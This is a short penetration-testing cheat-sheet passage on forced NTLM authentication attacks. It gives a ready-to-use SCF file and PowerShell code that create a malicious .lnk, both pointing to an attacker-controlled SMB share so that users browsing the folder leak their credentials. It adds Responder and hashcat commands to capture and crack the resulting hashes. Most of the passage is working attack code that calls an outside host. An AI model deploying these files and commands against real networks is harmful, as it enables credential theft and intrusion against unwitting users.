- create the following file and name it something like `@Inventory.scf`
- We put an @ at the start of the file name to appear at the top of the directory to ensure it is seen and executed by Windows Explorer. 
```
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```
- Starting Responder
```shell
sudo responder -wrf -v -I tun0

hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

> Note:
> Using SCFs no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious .lnk file

### Malicious .lnk File
- create .lnk file using [lnkbomb](https://github.com/dievus/lnkbomb)
- create .lnk file using powershell
```powershell

$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```
